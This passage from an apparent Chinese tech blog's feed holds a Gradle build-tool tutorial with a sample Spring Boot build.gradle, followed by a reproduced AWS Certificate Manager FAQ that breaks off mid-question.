        <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>Gradle JVM 的富有突破性构建工具，可以通过编程式的编写构建脚本，非 xml 的方式构建项目，适用于相对复杂 Java 项目构建。</p><p>特性：</p><ul><li>对已有的 maven 和 ivy 仓库的全面支持</li><li>支持传递性依赖管理，而不需要远程仓库或者 pom.xml 或者 ivy 配置文件</li><li>ant 式的任务和构建是 gradle 的第一公民</li><li>基于 groovy，其 build 脚本使用 groovy dsl 编写</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Gradle 需要依赖 Java，在 Mac 下可以使用 Homebrew 安装</p><blockquote><p>brew install gradle </p></blockquote><p>查看安装情况</p><blockquote><p>gradle -v </p></blockquote><p>Linux 下载解压后，添加 bin 目录到 path 路径下即可。</p><h2 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h2><h3 id="project"><a href="#project" class="headerlink" title="project"></a>project</h3><p>一个 project 或者 多个 project 是 gradle 的一个构建单位。每个 project 或许是一个 jar 包或者一个 web 应用，它也可以是一个由许多其他项目中产生的 jar 构成的 zip 压缩包。</p><p>一般默认 Java 项目以一个 project 构建，有时候也会有多模块（实际上就是多project）构建。project 可以存在父子关系。</p><h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><p>一个具体的构建任务，例如打包、测试、发布到仓库等。大部分情况下我们都是用插件提供的 task，不需要自己编写 task。</p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>我们看到的 java 项目中必定有一个插件</p><blockquote><p>apply plugin: ‘java’</p></blockquote><p>Gradle 不一定只是为 Java 使用的，因此大部分情况下我们通过 java 插件提供构建能力。基本上 java 构建的过程比较类似。</p><ul><li>编译</li><li>测试</li><li>打包</li><li>发布</li></ul><p>插件是 Gradle 比较重要而概念，很多有用的 task 都是它提供的。常见的插件有：</p><ul><li>java</li><li>idea</li><li>io.spring.dependency-management</li><li>spring-boot</li></ul><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>就是 java 项目需要用到的其他 jar 包。原始的 java 开发我们都是从网上手动下载，然后倒入项目，使用 gradle 可以自动帮我们导入。</p><h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><p>Gradle 是在一个被称之为仓库的地方找寻所需的外部依赖。仓库即是一个按 group，name 和 version 规则进行存储的一些文件。Gradle 可以支持不同的仓库存储格式，如 Maven 和 Ivy，并且还提供多种与仓库进行通信的方式，如通过本地文件系统或 HTTP。</p><p>默认情况下，Gradle 没有定义任何仓库，你需要在使用外部依赖之前至少定义一个仓库，例如 Maven 中央仓库。</p><h2 id="java-插件基本使用"><a href="#java-插件基本使用" class="headerlink" title="java 插件基本使用"></a>java 插件基本使用</h2><p>引入 java 插件我们可以 通过 gradle tasks 查看该插件提供的 tasks。我们创建一个 build.gralde 然后引入  java 插件，再看看有什么任务。</p><blockquote><p>vim build.gradle </p></blockquote><pre><code>// 这个 build.gradle 只有一行代码apply plugin: &#39;java&#39;</code></pre><blockquote><p>gradle tasks</p></blockquote><pre><code>Build tasks-----------assemble - Assembles the outputs of this project.build - Assembles and tests this project.buildDependents - Assembles and tests this project and all projects that depend on it.buildNeeded - Assembles and tests this project and all projects it depends on.classes - Assembles main classes.clean - Deletes the build directory.jar - Assembles a jar archive containing the main classes.testClasses - Assembles test classes.Build Setup tasks-----------------init - Initializes a new Gradle build.wrapper - Generates Gradle wrapper files.Documentation tasks-------------------javadoc - Generates Javadoc API documentation for the main source code.Help tasks----------buildEnvironment - Displays all buildscript dependencies declared in root project &#39;gradle-practise&#39;.components - Displays the components produced by root project &#39;gradle-practise&#39;. [incubating]dependencies - Displays all dependencies declared in root project &#39;gradle-practise&#39;.dependencyInsight - Displays the insight into a specific dependency in root project &#39;gradle-practise&#39;.dependentComponents - Displays the dependent components of components in root project &#39;gradle-practise&#39;. [incubating]help - Displays a help message.model - Displays the configuration model of root project &#39;gradle-practise&#39;. [incubating]projects - Displays the sub-projects of root project &#39;gradle-practise&#39;.properties - Displays the properties of root project &#39;gradle-practise&#39;.tasks - Displays the tasks runnable from root project &#39;gradle-practise&#39;.Verification tasks------------------check - Runs all checks.test - Runs the unit tests.</code></pre><p>使用 java 插件，我们需要按照规范设置目录，然后 gradle 会帮我们自动构建,这个目录不需要我们自己创建，按照 IDE 生成即可。</p><pre><code>project      +build      +src/main/java      +src/main/resources      +src/test/java      +src/test/resources  </code></pre><p>Gradle 默认会从 src/main/java 搜寻打包源码，在 src/test/java 下搜寻测试源码。并且 src/main/resources 下的所有文件按都会被打包，所有 src/test/resources 下的文件 都会被添加到类路径用以执行测试。所有文件都输出到 build 下，打包的文件输出到 build/libs 下</p><p>比较有用的几个命令</p><p>编译、打包、测试</p><blockquote><p>build</p></blockquote><p>编译，以及运行单元测试</p><blockquote><p>test </p></blockquote><p>清理项目</p><blockquote><p>clean </p></blockquote><h2 id="简单配置-java-项目"><a href="#简单配置-java-项目" class="headerlink" title="简单配置 java 项目"></a>简单配置 java 项目</h2><p>配置依赖仓库，也就是依赖寻找的位置，可以使用本地仓库（自动缓存）、mavenCentral、Jcenter、阿里云或者自己搭建的镜像。</p><pre><code>    repositories {        mavenLocal()        maven { url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39; }        maven { url &#39;http://maven.aliyun.com/nexus/content/repositories/jcenter&#39; }        mavenCentral()    }</code></pre><p>配置依赖</p><pre><code>dependencies {    testCompile group: &#39;junit&#39;, name: &#39;junit&#39;, version: &#39;4.+&#39;}</code></pre><p>gralde 总依赖除了有很多种类型，目前Gradle版本支持的依赖配置有：implementation、api、compileOnly、runtimeOnly 和 annotationProcessor，已经废弃的配置有：compile、provided、apk、providedCompile。</p><ul><li>implementation 会添加依赖到编译路径，并且会将依赖打包到输出（aar或apk），但是在编译时不会将依赖的实现暴露给其他module，也就是只有在运行时其他module才能访问这个依赖中的实现。</li><li>api 与compile对应，功能完全一样，会添加依赖到编译路径，并且会将依赖打包到输出（aar或apk），与implementation不同，这个依赖可以传递，其他module无论在编译时和运行时都可以访问这个依赖的实现，也就是会泄漏一些不应该不使用的实现。举个例子，A依赖B，B依赖C，如果都是使用api配置的话，A可以直接使用C中的类（编译时和运行时），而如果是使用implementation配置的话，在编译时，A是无法访问C中的类的。</li><li>compileOnly 与provided对应，Gradle把依赖加到编译路径，编译时使用，不会打包到输出（aar或apk）。这可以减少输出的体积，在只在编译时需要，在运行时可选的情况，很有用。</li><li>runtimeOnly 与apk对应，gradle添加依赖只打包到APK，运行时使用，但不会添加到编译路径。这个没有使用过。</li><li>annotationProcessor。编译前处理注解，例如 lombok。</li></ul><p>一个最简单的 java 项目可以由这两部分构成即可完成。</p><h2 id="spring-boot-插件"><a href="#spring-boot-插件" class="headerlink" title="spring boot 插件"></a>spring boot 插件</h2><p>在使用 Spring Boot 时，bootrun 这个task就是 Spring boot 插件提供的。</p><p>使用这个插件需要先配置 buildScript 告诉 gradle 插件从哪里找，因为 spring boot 并不是 gradle 的核心插件。</p><pre><code>buildscript {    ext {        springBootVersion = &#39;2.1.4.RELEASE&#39;    }    repositories {        gradlePluginPortal()    }    dependencies {    classpath(&quot;org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}&quot; as Object)    }}</code></pre><p>然后添加</p><pre><code>apply plugin: &#39;org.springframework.boot&#39;</code></pre><p>再查看 gradle tasks，就会多了一些 bootRun 等任务。</p><pre><code>Application tasks-----------------bootRun - Runs this project as a Spring Boot application.Build tasks-----------assemble - Assembles the outputs of this project.bootBuildInfo - Generates a META-INF/build-info.properties file.bootJar - Assembles an executable jar archive containing the main classes and their dependencies.build - Assembles and tests this project.buildDependents - Assembles and tests this project and all projects that depend on it.buildNeeded - Assembles and tests this project and all projects it depends on.classes - Assembles main classes.clean - Deletes the build directory.generateGitPropertiesjar - Assembles a jar archive containing the main classes.testClasses - Assembles test classes.</code></pre><h2 id="dependency-management-插件"><a href="#dependency-management-插件" class="headerlink" title="dependency-management 插件"></a>dependency-management 插件</h2><p>上面讲插件的依赖引入后，Spring boot 还提供了另外一个非常高级的插件。</p><p>引入</p><pre><code>apply plugin: &#39;io.spring.dependency-management&#39;</code></pre><p>Spring 版本火车中的子项目都可以不在需要指定版本号，版本号由 Spring boot 指定，从而解决 Spring 家族版本不一致的问题。</p><h2 id="wrapper"><a href="#wrapper" class="headerlink" title="wrapper"></a>wrapper</h2><p>wapper 是为了解决开发者拿到一个新项目没有本地安装的 gradle，或者版本不一致，导致非常不方便的问题。</p><p>配置项目时，需要用到 gradle 然后生成 gradle wrapper 文件（bat 或者 shell脚本）</p><ul><li>gradlew</li><li>gradlew.bat</li></ul><p>以及一些配置文件 .gradle</p><p>下一个开发者，运行项目时只需要有 java 不需要 gradle 即可使用 ./gradlew 运行即可。</p><p>首次生成 wrapper 的命令</p><blockquote><p>gradle wrapper </p></blockquote><h2 id="对-java-开发者需要注意的几个插件"><a href="#对-java-开发者需要注意的几个插件" class="headerlink" title="对 java 开发者需要注意的几个插件"></a>对 java 开发者需要注意的几个插件</h2><ul><li>java 插件</li><li>spring-boot 插件</li><li>dependency-management 插件</li></ul><h2 id="一份相对完整-spring-boot-配置清单"><a href="#一份相对完整-spring-boot-配置清单" class="headerlink" title="一份相对完整 spring boot 配置清单"></a>一份相对完整 spring boot 配置清单</h2><pre><code>// Gradle 构建本身需要的配置（例如插件仓库）buildscript {    // 配置变量    ext {        flywayVersion = &#39;3.2.1&#39;        hibernateVersion = &#39;5.3.7.Final&#39;    }    // 插件仓库    repositories {        gradlePluginPortal()    }    // 应用插件需要的依赖包    dependencies {        classpath(&quot;org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}&quot; as Object)    }}// idea 插件，用来生成 idea 工程目录apply plugin: &#39;idea&#39;// java 插件,提供 build、jar 等taskapply plugin: &#39;java&#39;// spring boot 插件提供 bootrun 等task，非必须apply plugin: &#39;org.springframework.boot&#39;// dependency-management 插件，为spring 版本火车项目提供一致的版本号apply plugin: &#39;io.spring.dependency-management&#39;// 指定构建输出目录buildDir = &#39;./out&#39;// 指定包信息group = &#39;cn.printf&#39;version = &#39;1.0.0&#39;// java 版本sourceCompatibility = 1.8targetCompatibility = 1.8// 编译字符集tasks.withType(JavaCompile) { options.encoding = &#39;utf-8&#39; }// 包依赖仓库repositories {    mavenLocal()    maven { url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39; }    maven { url &#39;http://maven.aliyun.com/nexus/content/repositories/jcenter&#39; }    mavenCentral()}// 依赖dependencies {    // 监控    compile &#39;org.springframework.boot:spring-boot-starter-actuator&#39;    compileOnly &quot;org.projectlombok:lombok&quot;    testCompileOnly &quot;org.projectlombok:lombok&quot;    // web     compile &#39;org.springframework.boot:spring-boot-starter-web&#39;    // Session    compile &#39;org.springframework.boot:spring-boot-starter-data-redis&#39;    compile &#39;org.springframework.session:spring-session-data-redis&#39;    // database    compile &#39;org.springframework.boot:spring-boot-starter-data-jpa&#39;    runtimeOnly &#39;mysql:mysql-connector-java&#39;    // 数据库迁移    compile &#39;org.flywaydb:flyway-core&#39;    // 对象转换    compile group: &#39;org.modelmapper&#39;, name: &#39;modelmapper&#39;, version: &#39;1.1.1&#39;    // 加密库    compile &#39;commons-codec:commons-codec:1.13&#39;    // 测试    testCompile(&quot;org.springframework.boot:spring-boot-starter-test&quot;)    // 开发热启动工具    runtime(&#39;org.springframework.boot:spring-boot-devtools&#39;)}</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>教程 <a href="https://www.w3cschool.cn/gradle/6qo51htq.html" target="_blank" rel="noopener">https://www.w3cschool.cn/gradle/6qo51htq.html</a></li><li><a href="https://docs.gradle.org/current/userguide/command_line_interface.html" target="_blank" rel="noopener">https://docs.gradle.org/current/userguide/command_line_interface.html</a></li><li><a href="https://www.jianshu.com/p/59fd653a54d2" target="_blank" rel="noopener">https://www.jianshu.com/p/59fd653a54d2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>AWS Certificate Manager 常见问题</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws-certificate-manager-faqs/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws-certificate-manager-faqs/</url>
      
        <content type="html"><![CDATA[<h3 id="一般性问题"><a href="#一般性问题" class="headerlink" title="一般性问题"></a>一般性问题</h3><p>问：什么是 AWS Certificate Manager (ACM)？</p><p>AWS Certificate Manager 是一项服务，可帮助您轻松地预置、管理和部署用于 AWS 服务的安全套接字层/传输层安全性 (SSL/TLS) 证书。SSL/TLS 证书用于保护网络通信的安全并确立网站在 Internet 上的身份。使用 AWS Certificate Manager，您无需再为购买、上传和更新 SSL/TLS 证书而经历耗时的手动流程。利用 AWS Certificate Manager，您可以快速请求证书，在 AWS 资源 (如 Amazon API Gateway 上的 Elastic Load Balancer、Amazon CloudFront 分配或 API) 上部署该证书，并让 AWS Certificate Manager 处理证书更新事宜。通过 AWS Certificate Manager 预置的 SSL/TLS 证书可免费使用。您只需为您创建的用于运行应用程序的 AWS 资源付费。</p><p>问：什么是 SSL/TLS 证书？</p><p>SSL/TLS 证书使 Web 浏览器能够标识使用安全套接字层/传输层安全性 (SSL/TLS) 协议的网站并与之建立加密的网络连接。证书在名为公有密钥基础设施 (PKI) 的加密系统中使用。通过 PKI，在双方都信任同一个第三方 (称为证书颁发机构) 的情况下，一方可以为使用证书的另一方确立身份。ACM 用户指南、概念和术语提供了其他背景信息和定义。</p><p>问：AWS Certificate Manager 有什么作用？</p><p>您可以请求并预置 SSL/TLS 证书，然后为使用 Elastic Load Balancing、Amazon CloudFront 或 Amazon API Gateway 的站点和应用程序部署这些证书。验证请求域的所有权并获得颁发的证书之后，您可以从 AWS 管理控制台的下拉列表中选择 SSL/TLS 证书并部署该证书。或者，您也可以使用 AWS 命令行界面 (CLI) 命令或 API 调用将 ACM 提供的证书部署到 AWS 资源。ACM 会为您管理证书更新和证书部署事宜。</p><p>问：使用 AWS Certificate Manager 有哪些优势？</p><p>借助 ACM，您可以更加轻松地为 AWS 平台上的网站或应用程序启用 SSL/TLS。ACM 免除了过去与使用 SSL/TLS 和管理 SSL/TLS 证书相关的大量手动流程。ACM 还可管理证书更新，从而帮助您避免因证书配置错误、撤销或过期而导致的停机。您可获得 SSL/TLS 保护并轻松管理证书。启用 SSL/TLS 有助于提高站点的搜索排名，并可帮助您满足传输数据加密的法规合规性要求。</p><p>当您使用 ACM 时，它会应用强加密和密钥管理最佳实践来确保证书私有密钥的安全。借助 ACM，您可以使用 AWS 管理控制台、AWS CLI 或 AWS Certificate Manager API 集中管理 AWS Certificate Manager 在 AWS 区域内提供的所有 SSL/TLS 证书。AWS Certificate Manager 集成了其他 AWS 服务，因此您可以请求 SSL/TLS 证书，然后通过 AWS 管理控制台、AWS CLI 命令或 API 调用为 Elastic Load Balancing 负载均衡器或 Amazon CloudFront 分配预置证书。</p><p>问：如何开始使用 ACM？</p><p>要开始使用 AWS Certificate Manager，请导航到 AWS 管理控制台中的“Certificate Manager”，然后使用向导输入站点的名称以请求 SSL/TLS 证书。您也可以使用 AWS CLI 或 API 请求证书。在 ACM 获得域所有者的批准并且系统颁发 SSL/TLS 证书后，您就可以将其用于与 ACM 集成的其他 AWS 资源了。您只需从 AWS 管理控制台的下拉列表中选择您要部署的 SSL/TLS 证书即可。或者，您也可以执行一个 AWS CLI 命令或调用一个 AWS API，将该证书与您的资源关联起来。AWS Certificate Manager 随后会将该证书部署到您选择的资源。有关请求和使用 AWS Certificate Manager 所提供证书的更多信息，请参阅《AWS Certificate Manager 用户指南》中的入门。</p><p>问：ACM 提供哪种类型的证书？</p><p>ACM 提供域验证 (DV) 证书，供终止 SSL/TLS 的网站和应用程序使用。有关 ACM 提供的证书的更多详细信息，请参阅证书特点。</p><p>问：我可以将 ACM 提供的证书用于哪些 AWS 服务？</p><p>您可以将 ACM 用于以下 AWS 服务：<br>• Elastic Load Balancing – 请参阅 Elastic Load Balancing 文档<br>• Amazon CloudFront – 请参阅 CloudFront 文档<br>• Amazon API Gateway – 请参阅 API Gateway 文档<br>• AWS Elastic Beanstalk – 请参阅 AWS Elastic Beanstalk 文档<br>问：ACM 提供的证书是否适合政府部门？</p><p>ACM 证书可能适合部分政府部门，而并非对所有政府部门均适合。请查看当地法律、规则和法规，以确定某个 ACM 证书是否适合。如有任何疑问，请访问 AWS Support 中心并创建案例。</p><p>问：ACM 在哪些区域提供？</p><p>请访问 AWS 全球基础设施页面，了解目前提供 AWS 服务的区域。要将 ACM 证书与 Amazon CloudFront 配合使用，您必须在美国东部 (弗吉尼亚北部) 区域申请或导入该证书。该区域内与 CloudFront 分配关联的 ACM 证书将被分发到为该分配配置的所有地理位置。</p><p>问：我是否可以在多个 AWS 区域使用同一证书？</p><p>这要取决于您目前使用的是 Elastic Load Balancing 还是 Amazon CloudFront。要在不同区域内针对同一站点 (具有相同的完全限定域名 (FQDN) 或 FQDN 集) 将某个证书与 Elastic Load Balancing 配合使用，您需要为计划使用证书的每个区域申请新证书。请注意，还需要针对新区域重新验证证书中的每个名称。要将 ACM 证书与 Amazon CloudFront 配合使用，您必须在美国东部 (弗吉尼亚北部) 区域申请该证书。该区域内与 CloudFront 分配关联的 ACM 证书将被分发到为该分配配置的所有地理位置。</p><p>问：是否可以在区域之间复制证书？</p><p>目前不可以。</p><p>问：如果同一域名我已拥有来自其他提供商的证书，我是否还能够使用 ACM 配置证书？</p><p>是。<br>问：我是否可以在 Amazon EC2 实例或自己的服务器上使用证书？</p><p>不可以。目前，ACM 提供的证书只能用于特定 AWS 服务。请参阅我可以将 ACM 提供的证书用于哪些 AWS 服务？</p><p>问：我能够通过 ACM 预置的证书数量是否有限制？</p><p>默认情况下，您可以在每个区域中为每个账户预置多达 100 个证书。通过 ACM 预置的每个证书最多可以拥有 10 个完全限定域名。您可以访问 AWS Support 中心请求增加上限。有关更多详细信息，请参阅 AWS 文档。</p><h3 id="预置证书"><a href="#预置证书" class="headerlink" title="预置证书"></a>预置证书</h3><p>问：如何预置 ACM 提供的证书？</p><p>您可以使用 AWS 管理控制台、AWS CLI 或 ACM API/SDK 进行预置。要使用 AWS 管理控制台，请导航到控制台的 ACM 部分，选择“Request a Certificate”，输入站点的域名，然后按照屏幕上的说明完成请求。如果用户可以通过其他名称访问您的站点，则可以在请求中添加其他域名。域的所有者会收到一封关于请求批准颁发证书的电子邮件。在请求中的所有域名获得域所有者的批准后，系统将颁发证书并准备好预置证书以用于其他 AWS 服务，如 Elastic Load Balancing 或 Amazon CloudFront。有关详细信息，请参阅 ACM 文档。<br>问：颁发证书需要多长时间？</p><p>获得域的所有者或域所有者授权代表的批准后，系统通常会在几分钟内颁发证书，但也可能需要更长时间。有关更多详细信息，请参阅如何预置 ACM 提供的证书？<br>问：请求证书时会发生什么情况？</p><p>为了验证您对请求的证书中包括的域名或名称的控制权，系统会针对证书请求中的每个域名向注册域的所有者发送电子邮件。在域的所有者或授权代表批准证书请求之前，证书请求将处于待验证状态。域的所有者或授权代表 (审批者) 可以按照电子邮件中的说明批准证书请求。说明将指引审批者导航到审批网站，单击电子邮件中的链接或将电子邮件中的链接粘贴到浏览器中，以导航到审批网站。审批者确认与证书请求相关的信息，如域名、证书 ID (ARN) 以及发出请求的 AWS 账户 ID，如果信息准确无误，则批准请求。在证书请求中的所有域名获得批准后，系统通常会在几分钟内颁发证书，届时证书请求的状态将变为已颁发。获得颁发的证书后，您便可以开始将其用于其他 AWS 服务。<br>问：审批请求要发送到哪个电子邮件地址？<br>当您请求证书时，系统会针对证书请求中的每个域名使用 WHOIS 查找来检索该域的联系人信息。电子邮件会发送至针对该域列出的域注册人、管理联系人和技术联系人。电子邮件还会同时发送至域的五个特定电子邮件地址，即在您请求的域名前加上 admin@、administrator@、hostmaster@、webmaster@ 和 postmaster@ 生成的五个地址。例如，如果您为 server.example.com 请求证书，系统将使用针对 example.com 域，外加 <a href="mailto:admin@server.example.com" target="_blank" rel="noopener">admin@server.example.com</a>、<a href="mailto:administrator@server.example.com" target="_blank" rel="noopener">administrator@server.example.com</a>、<a href="mailto:hostmaster@server.example.com" target="_blank" rel="noopener">hostmaster@server.example.com</a>、<a href="mailto:postmaster@server.example.com" target="_blank" rel="noopener">postmaster@server.example.com</a> 和 <a href="mailto:webmaster@server.example.com" target="_blank" rel="noopener">webmaster@server.example.com</a> 的 WHOIS 查询返回的联系人信息将电子邮件发送至域注册人、技术联系人和管理联系人。</p><p>针对以“www”开头的域名或以星号 (*) 开头的通配符名称，这五个特定电子邮件地址采用不同的构造方式。ACM 会删除前导的“www”或星号，而电子邮件则被发送到通过在域名其余部分之前加上 admin@、administrator@、hostmaster@、postmaster@ 和 webmaster@ 来构造的管理员地址。例如，如果您为 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 请求证书，则电子邮件被发送到 WHOIS 联系人 (如前所述) 以及 <a href="mailto:admin@example.com" target="_blank" rel="noopener">admin@example.com</a>，而不是 <a href="mailto:admin@www.example.com" target="_blank" rel="noopener">admin@www.example.com</a>。其余四个特定电子邮件地址也采用类似的方式构造。</p><p>请求证书之后，您可以使用 ACM 控制台、AWS CLI 或 API 查看针对各个域发送的电子邮件的收件方电子邮件地址列表。<br>问：我是否可以配置接收证书审批请求的电子邮件地址？</p><p>不可以，不过您可以配置用于接收验证电子邮件的基础域名。基础域名必须是证书请求中域名的超级域。例如，如果您想为 server.domain.example.com 请求证书，但希望将审批电子邮件发送至 <a href="mailto:admin@domain.example.com" target="_blank" rel="noopener">admin@domain.example.com</a>，则可以使用 AWS API 或 API 实现这一目的。有关更多详细信息，请参阅 ACM CLI 参考和 ACM API 参考。<br>问：我是否可以使用具有代理联系人信息 (例如 Privacy Guard 或 WhoisGuard) 的域？</p><p>可以；不过，电子邮件的发送可能会因为代理而延迟。通过代理发送的电子邮件可能会进入您的垃圾邮件文件夹。有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：ACM 是否可以通过我的 AWS 账户的技术联系人验证我的身份？</p><p>不可以。验证域所有者身份的流程和策略非常严格，并且由为公开可信的证书颁发机构设置策略标准的 CA/Browser Forum 决定。要了解详情，请参阅 Amazon Trust Services 存储库中最新的“Amazon Trust Services 认证规范声明”。<br>问：我的证书请求状态为什么是“待验证”？</p><p>已发出请求但未经过批准的证书的状态为待验证。域的所有者或授权代表必须批准证书请求，然后系统才能颁发证书。</p><p>问：如果我没有收到验证和批准电子邮件，该怎么做？</p><p>有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：我的证书请求状态为什么显示为“失败”？</p><p>有多种原因会导致域的验证控制流程失败，包括但不限于：网络资源的网址列表中包括的域被认定为包含恶意软件或欺诈性内容。要确定申请失败的原因，请访问 ACM 故障排除指南。</p><p>问：我的证书请求状态为什么显示为“验证超时”？</p><p>如果 ACM 证书请求在 72 小时内没有接受验证，则被视为超时。有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：是否有其他方法来验证域或审批支持的证书？</p><p>目前没有。</p><h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>问：浏览器、操作系统和移动设备是否信任 ACM 提供的证书？</p><p>目前的绝大部分浏览器、操作系统和移动设备都信任 ACM 提供的证书。ACM 提供的证书在浏览器和操作系统中的普及率高达 99%，包括 Windows XP SP3 和 Java 6 及更高版本。</p><p>问：如何确认我的浏览器是否信任 ACM 提供的证书？</p><p>信任 ACM 提供的证书的浏览器会显示一个锁形图标，并且在连接到使用 ACM 基于 SSL/TLS 提供的证书 (例如使用 HTTPS) 的站点时会显示不要颁发证书的警告。</p><p>ACM 提供的证书由亚马逊的证书颁发机构 (CA) 进行验证。任何包含 Amazon Root CA 1、Starfield Services Root Certificate Authority – G2 或 Starfield Class 2 Certification Authority 的浏览器、应用程序和操作系统均会信任由 ACM 提供的证书。</p><p>问：ACM 是否可以提供包括多个域名的证书？</p><p>可以。每个证书必须包括至少一个域名，并且您可以根据需要在证书中添加更多域名。例如，您可以将域名“<a href="http://www.example.net”添加到用于“www.example.com”的证书，前提是用户通过这两个域名都可以访问您的站点。对于证书请求中包括的所有名称，您必须具有所有权和控制权。" target="_blank" rel="noopener">www.example.net”添加到用于“www.example.com”的证书，前提是用户通过这两个域名都可以访问您的站点。对于证书请求中包括的所有名称，您必须具有所有权和控制权。</a></p><p>问：什么是通配符域名？</p><p>通配符域名匹配域中的所有第一级子域或主机名。第一级子域是一个不包含句号 (圆点) 的域名标签。例如，您可以使用名称“*.example.com”保护 <a href="http://www.example.com、images.example.com" target="_blank" rel="noopener">www.example.com、images.example.com</a> 以及以 .example.com 结尾的任何其他主机名或第一级子域。有关更多详细信息，请参阅 ACM 用户指南。</p><p>问：ACM 是否可以提供带有通配符域名的证书？</p><p>可以。</p><p>问：ACM 是否提供组织验证 (OV) 或扩展验证 (EV) 证书？</p><p>目前不提供。</p><p>问：ACM 是否为网站提供除 SSL/TLS 以外的其他类型的证书？</p><p>目前不提供。</p><p>问：我是否可以使用 ACM 提供的证书进行代码签名或电子邮件加密？</p><p>不可以。</p><p>问：ACM 是否提供用于签名和加密电子邮件的证书 (S/MIME 证书) ？</p><p>目前不提供。</p><p>问：ACM 提供的证书使用哪些算法？</p><p>ACM 证书使用的是采用 2048 位模数和 SHA-256 的 RSA 密钥。</p><p>问：ACM 是否支持椭圆曲线 (ECDSA) 证书？</p><p>目前不支持。<br>问：亚马逊在哪里介绍其关于颁发证书的策略和规范？</p><p>“Amazon Trust Services 证书策略”和“Amazon Trust Services 证书规范声明”文档中提供了相关信息。有关最新版本，请参阅 Amazon Trust Services 存储库。</p><p>问：如何撤销证书？</p><p>您可以访问 AWS Support 中心并创建案例，以请求 ACM 撤销证书。 </p><p>问：如果证书中的信息发生更改，我该如何通知 AWS？</p><p>您可以发送电子邮件至 validation-questions[at]amazon.com，通知 AWS。</p><p> </p><h3 id="私有密钥保护"><a href="#私有密钥保护" class="headerlink" title="私有密钥保护"></a>私有密钥保护</h3><p>问：ACM 提供的证书的私有密钥是如何管理的？</p><p>系统会为 ACM 提供的每个证书创建一个键前缀。AWS Certificate Manager 可保护并管理用于 SSL/TLS 证书的私有密钥。ACM 会运用强加密和密钥管理最佳实践来保护并存储私有密钥。</p><p>问：ACM 是否可以跨 AWS 区域复制证书？</p><p>不可以。每个 ACM 证书私有密钥均存储在您请求该证书的区域。例如，当您在弗吉尼亚北部区域获得新的证书后，ACM 会将私有密钥存储在弗吉尼亚北部区域。仅当 ACM 证书与 CloudFront 分配关联时，该证书才能跨区域复制。在这种情况下，CloudFront 会将 ACM 证书分配到为您的分配配置的地理位置。</p><p>问：我是否可以对证书私有密钥的使用进行审核？</p><p>可以。您可以使用 AWS CloudTrail 查看日志，从而了解证书私有密钥的使用时间。</p><h3 id="记账功能"><a href="#记账功能" class="headerlink" title="记账功能"></a>记账功能</h3><p>问：ACM 证书的使用如何收费和计费？</p><p>通过 AWS Certificate Manager 预置、管理和部署的 SSL/TLS 证书可免费使用。您只需针对为运行应用程序而创建的 AWS 资源付费，例如 Elastic Load Balancing 负载均衡器或 Amazon CloudFront 分配。</p><h3 id="详细信息"><a href="#详细信息" class="headerlink" title="详细信息"></a>详细信息</h3><p>问：我是否可以将同一证书用于多个 Elastic Load Balancing 负载均衡器和多个 CloudFront 分配？</p><p>可以。</p><p>问：我是否可以将证书用于没有公共 Internet 访问权限的内部 Elastic Load Balancing 负载均衡器？</p><p>可以。请参阅托管更新与部署，详细了解 ACM 如何处理无法通过公共 Internet 访问的证书的更新问题。</p><p>问：用于 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 的证书是否也能用于 example.com？</p><p>不可以。如果您希望自己的站点能够被两个域名 (<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 和 example.com) 引用，则必须请求包含这两个名称的证书。</p><p>问：我是否可以导入第三方证书并将其用于 AWS 服务？</p><p>可以。如果想要将第三方证书与 Amazon CloudFront 或 Elastic Load Balancing 配合使用，您可以使用 AWS 管理控制台、AWS CLI 或 AWS Certificate Manager API 将该证书导入 ACM。ACM 不会处理已导入证书的更新流程。您可以使用 AWS 管理控制台监控已导入证书的到期日期，并导入新的第三方证书以便替换即将过期的证书。</p><p>问：ACM 提供的证书的有效期是多久？</p><p>目前，ACM 提供的证书的有效期为 13 个月。</p><p>问：ACM 如何帮助我的企业或组织满足合规性要求？</p><p>使用 ACM 可以轻松确保连接的安全性 (这也是 PCI、 FedRAMP 以及 HIPAA 等众多合规性计划的共同要求)，从而帮助您遵守法规要求。有关合规性的具体信息，请参阅 <a href="http://aws.amazon.com/compliance。" target="_blank" rel="noopener">http://aws.amazon.com/compliance。</a></p><p>问：ACM 是否有服务等级协议 (SLA)？</p><p>目前没有。</p><p>问：ACM 是否允许域名 (也称为国际化域名 (IDN)) 中包含本地语言字符？</p><p>ACM 不支持采用 Unicode 编码的本地语言字符；不过，ACM 支持域名使用 ASCII 编码的本地语言字符。</p><p>问：ACM 支持哪些域名标签格式？</p><p>ACM 仅支持采用 UTF-8 编码的 ASCII 字符，包括包含“xn-”的标签 (通常称为域名的 Punycode)。ACM 不支持域名中使用 Unicode 输入 (Unicode 标签)。</p><p>问：ACM 